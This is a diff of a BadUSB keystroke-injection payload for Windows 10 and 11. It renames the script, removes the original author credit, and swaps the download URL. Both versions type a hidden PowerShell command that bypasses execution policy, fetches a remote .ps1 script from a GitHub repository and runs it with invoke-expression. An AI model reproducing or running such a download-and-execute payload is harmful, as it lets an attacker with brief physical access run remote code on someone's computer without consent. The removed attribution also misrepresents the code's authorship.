@@ -1,9 +1,4 @@
-REM     Title: Wallpaper-Troll
-
-REM     Author: I am Jakoby
-
-REM     Description: This payload is meant to taunt your target with a revealing wallpaper. See README.md for more details
-
+REM     Title: Wallpaper-BadUsb
 REM     Target: Windows 10, 11
 
 REM     Remeber to replace the link with your link for the intended file to download if you are using a custom variant of this payload
@@ -15,6 +10,6 @@ REM     ------------------------------------------------------------------------
 
 GUI r
 DELAY 500
-STRING powershell -w h -NoP -NonI -Exec Bypass $pl = iwr https://raw.githubusercontent.com/I-Am-Jakoby/hak5-submissions/main/OMG/Payloads/OMG-Wallpaper-Troll/Wallpaper-Troll.ps1?dl=1; invoke-expression $pl
+STRING powershell -w h -NoP -NonI -Exec Bypass $pl = iwr https://raw.githubusercontent.com/Bob337/wallpaper_badusb/main/Wallpaper-Troll.ps1?dl=1; invoke-expression $pl
 DELAY 500
 ENTER
